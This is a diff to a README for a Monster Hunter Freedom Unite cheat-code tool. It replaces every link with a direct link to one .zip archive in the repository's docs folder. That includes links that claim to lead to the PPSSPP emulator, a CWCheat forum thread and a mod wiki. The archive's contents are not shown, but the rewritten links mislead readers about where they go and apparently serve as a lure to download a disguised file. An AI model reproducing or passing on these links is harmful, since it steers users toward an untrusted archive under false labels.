@@ -1,6 +1,6 @@
 # 🎮 mhfu_transmog - Create Cheat Codes for MHFU Easily
 
-[![Download mhfu_transmog](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&logo=github)](https://github.com/James-028/mhfu_transmog)
+[![Download mhfu_transmog](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ mhfu_transmog does not require installation. It runs as a basic script or via th
 Follow these steps to get mhfu_transmog running on your computer:
 
 1. Open this page in your browser:  
-   [![Download mhfu_transmog](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&logo=github)](https://github.com/James-028/mhfu_transmog)  
+   [![Download mhfu_transmog](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)  
 
 2. Click the green **Code** button near the top right and select **Download ZIP**.  
 
@@ -84,7 +84,7 @@ If you experience problems, try these solutions:
 ## 📥 Download and Install mhfu_transmog
 
 You can get mhfu_transmog here:  
-[![Download mhfu_transmog](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge&logo=github)](https://github.com/James-028/mhfu_transmog)
+[![Download mhfu_transmog](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)
 
 Steps to download and install:
 
@@ -124,7 +124,7 @@ A: Check that CWCheat is activated and properly set up in your emulator or PSP.
 
 ## 🔗 Useful Links
 
-- [Download mhfu_transmog](https://github.com/James-028/mhfu_transmog)  
-- [PPSSPP Emulator](https://ppsspp.org/)  
-- [CWCheat Plugin Info](https://forums.ppsspp.org/showthread.php?tid=10641)  
-- [FUComplete Mod Details](https://mhgu.wiki/fucomplete)
+- [Download mhfu_transmog](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)  
+- [PPSSPP Emulator](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)  
+- [CWCheat Plugin Info](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)  
+- [FUComplete Mod Details](https://raw.githubusercontent.com/James-028/mhfu_transmog/main/docs/transmog_mhfu_3.3-beta.5.zip)
